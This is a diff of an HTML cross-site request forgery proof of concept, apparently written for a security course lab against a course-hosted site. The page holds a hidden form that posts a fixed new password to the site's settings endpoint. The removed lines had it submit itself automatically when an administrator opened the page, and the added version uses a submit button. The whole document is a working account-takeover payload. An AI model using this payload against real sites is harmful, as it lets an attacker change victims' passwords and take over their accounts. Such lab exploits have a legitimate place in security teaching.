@@ -1,19 +1,27 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit</title>
+    <title>CSRF PoC</title>
 </head>
 <body>
-    <!-- Форма отправляет данные на скрытый эндпоинт настроек -->
-    <form id="csrfForm" action="https://is-course.ru" method="POST">
-        <input type="hidden" name="password" value="7raF~)+G@+_RN8X" />
-        <input type="hidden" name="confirm-password" value="7raF~)+G@+_RN8X" />
+
+    <h1>CSRF Test</h1>
+
+    <form id="csrfForm"
+          action="https://cats.is-course.ru/settings"
+          method="POST">
+
+        <input type="hidden"
+               name="password"
+               value="7raF~)+G@+_RN8X">
+
+        <input type="hidden"
+               name="confirm-password"
+               value="7raF~)+G@+_RN8X">
+
+        <button type="submit">Submit</button>
     </form>
 
-    <script>
-        // Скрипт срабатывает автоматически при загрузке страницы админом
-        document.getElementById('csrfForm').submit();
-    </script>
 </body>
 </html>
